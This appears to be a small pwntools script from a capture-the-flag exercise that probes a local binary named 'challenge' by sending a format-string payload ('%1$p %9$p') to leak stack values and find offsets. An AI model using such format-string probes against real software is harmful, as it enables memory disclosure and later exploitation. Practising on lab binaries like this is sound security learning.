from pwn import *

context.binary = './challenge'
context.log_level = 'error'

def check_offset_1():
    p = process('./challenge')
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Transmit data: ')
    

    p.sendline(b'%1$p %9$p')
    
    p.recvuntil(b'The archives echo back: ')
    res = p.recvline()
    print(f"Result: {res}")
    p.close()

check_offset_1()
